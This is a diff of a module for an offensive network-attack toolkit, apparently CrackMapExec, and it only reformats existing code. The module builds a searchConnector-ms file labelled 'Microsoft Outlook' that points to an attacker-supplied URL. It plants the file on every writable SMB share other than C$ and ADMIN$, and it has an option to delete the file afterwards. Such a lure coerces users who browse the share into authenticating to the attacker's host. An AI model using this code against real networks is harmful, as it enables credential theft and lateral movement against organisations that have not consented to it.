@@ -49,18 +49,13 @@ class CMEModule:
             scfile = open(self.scfile_path, "w")
             scfile.truncate(0)
             scfile.write('<?xml version="1.0" encoding="UTF-8"?>')
-            scfile.write(
-                "<searchConnectorDescription"
-                ' xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">'
-            )
+            scfile.write("<searchConnectorDescription" ' xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">')
             scfile.write("<description>Microsoft Outlook</description>")
             scfile.write("<isSearchOnlyItem>false</isSearchOnlyItem>")
             scfile.write("<includeInStartMenuScope>true</includeInStartMenuScope>")
             scfile.write(f"<iconReference>{self.url}/0001.ico</iconReference>")
             scfile.write("<templateInfo>")
-            scfile.write(
-                "<folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>"
-            )
+            scfile.write("<folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>")
             scfile.write("</templateInfo>")
             scfile.write("<simpleLocation>")
             scfile.write("<url>{}</url>".format(self.url))
@@ -72,37 +67,19 @@ class CMEModule:
         shares = connection.shares()
         for share in shares:
             context.log.debug(f"Share: {share}")
-            if "WRITE" in share["access"] and (
-                share["name"] == self.sharename
-                if self.sharename != ""
-                else share["name"] not in ["C$", "ADMIN$"]
-            ):
+            if "WRITE" in share["access"] and (share["name"] == self.sharename if self.sharename != "" else share["name"] not in ["C$", "ADMIN$"]):
                 context.log.success(f"Found writable share: {share['name']}")
                 if not self.cleanup:
                     with open(self.scfile_path, "rb") as scfile:
                         try:
-                            connection.conn.putFile(
-                                share["name"], self.file_path, scfile.read
-                            )
-                            context.log.success(
-                                f"[OPSEC] Created {self.filename}.searchConnector-ms"
-                                f" file on the {share['name']} share"
-                            )
+                            connection.conn.putFile(share["name"], self.file_path, scfile.read)
+                            context.log.success(f"[OPSEC] Created {self.filename}.searchConnector-ms" f" file on the {share['name']} share")
                         except Exception as e:
                             context.log.exception(e)
-                            context.log.fail(
-                                f"Error writing {self.filename}.searchConnector-ms file"
-                                f" on the {share['name']} share: {e}"
-                            )
+                            context.log.fail(f"Error writing {self.filename}.searchConnector-ms file" f" on the {share['name']} share: {e}")
                 else:
                     try:
                         connection.conn.deleteFile(share["name"], self.file_path)
-                        context.log.success(
-                            f"Deleted {self.filename}.searchConnector-ms file on the"
-                            f" {share['name']} share"
-                        )
+                        context.log.success(f"Deleted {self.filename}.searchConnector-ms file on the" f" {share['name']} share")
                     except Exception as e:
-                        context.log.fail(
-                            f"[OPSEC] Error deleting {self.filename}.searchConnector-ms"
-                            f" file on share {share['name']}: {e}"
-                        )
+                        context.log.fail(f"[OPSEC] Error deleting {self.filename}.searchConnector-ms" f" file on share {share['name']}: {e}")
